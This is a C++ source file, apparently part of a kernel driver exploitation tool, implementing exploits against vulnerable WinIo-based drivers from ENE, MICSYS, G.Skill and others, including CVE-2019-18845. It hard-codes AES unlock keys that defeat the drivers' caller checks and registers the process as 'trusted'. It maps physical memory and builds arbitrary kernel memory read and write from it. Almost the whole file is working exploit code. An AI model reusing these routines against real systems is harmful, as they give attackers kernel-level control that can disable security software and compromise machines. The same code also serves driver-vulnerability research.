/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       WINIO.CPP
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  WINIO based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winio.h"

#ifdef __cplusplus
extern "C" {
#include "tinyaes/aes.h"
}
#endif

//
// AES keys used by EneTechIo latest variants.
//
ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };

//
// Generic WINIO interface for all supported drivers based on WINIO code.
//
// MICSYS RGB driver interface for CVE-2019-18845.
// Ptolemy Tech Co., Ltd ENE driver interface
// G.Skill EneIo64 driver interface
// ... and multiple others
//

typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject);

typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject);

PUCHAR g_pvAESKey;
pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;
BOOL g_PhysAddress64bit = FALSE;

/*
* MsIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MsIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = PhysicalAddress + NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* MsIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MsIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID WinIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    if (supCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID WinIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory2
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
* EneTechIo latest version variant with requestor check.
*
*/
PVOID WinIoMapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.CommitSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    if (supCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory2
*
* Purpose:
*
* Unmap previously mapped physical memory.
* EneTechIo latest version variant with requestor check.
*
*/
VOID WinIoUnmapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    supCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WinIoQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    do {

        pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
            0ULL,
            0x100000,
            &sectionHandle,
            &refObject);

        if (pbLowStub1M == 0) {
            dwError = GetLastError();
            break;
        }

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;
        else
            *Value = 0;

        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);

    } while (FALSE);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* WinIoReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI WinIoReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = g_WinIoMapMemoryRoutine(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &refObject);

    if (mappedSection) {

        offset = PhysicalAddress;

        __try {

            if (DoWrite) {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
                }
            }
            else {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
                }
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            mappedSection,
            sectionHandle,
            refObject);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI WinIoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* WinIoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WinIoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* WinIoVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WinIoVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        WinIoQueryPML4Value,
        WinIoReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* WinIoReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WinIoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WinIoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* GlckIo2Register
*
* Purpose:
*
* Register in GlckIo2 "trusted" process list.
*
*/
BOOL GlckIo2Register(
    _In_ HANDLE DeviceHandle)
{
    AES_ctx ctx;
    ULONG_PTR encryptedProcessId;
    UCHAR Buffer[16];
    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlSecureZeroMemory(&OutBuf, sizeof(OutBuf));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    return supCallDriver(DeviceHandle,
        IOCTL_GKCKIO2_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));
}

/*
* WinIoPreOpen
*
* Purpose:
*
* Pre-open callback for some variants of Ene WinIo drivers.
*
*/
BOOL WINAPI WinIoPreOpen(
    _In_ PVOID Param
)
{
    UNREFERENCED_PARAMETER(Param);
    return supManageDummyDll(DUMMYDLL, FALSE);
}

/*
* WinIoRegisterDriver
*
* Purpose:
*
* Register WinIo driver.
*
*/
BOOL WINAPI WinIoRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    switch (DriverId) {
    case IDR_GLCKIO2:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;

        if (!GlckIo2Register(DeviceHandle))
            return FALSE;

        break;

    case IDR_MSIO64:
        g_WinIoMapMemoryRoutine = MsIoMapMemory;
        g_WinIoUnmapMemoryRoutine = MsIoUnmapMemory;
        g_PhysAddress64bit = FALSE;
        break;

    case IDR_ENETECHIO64:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey;
        g_PhysAddress64bit = TRUE;
        break;

    case IDR_ENETECHIO64B:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey2;
        g_PhysAddress64bit = TRUE;
        break;

    default:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        break;
    }

    return TRUE;
}

/*
* WinIoUnregisterDriver
*
* Purpose:
*
* Unregister routine for some variants of WinIo driver.
*
*/
BOOL WINAPI WinIoUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;

    UNREFERENCED_PARAMETER(DeviceHandle);

    if (Context) {

        if (Context->Provider->ResourceId == IDR_ENETECHIO64B) {

            return supManageDummyDll(DUMMYDLL, TRUE);

        }
    }

    return FALSE;
}
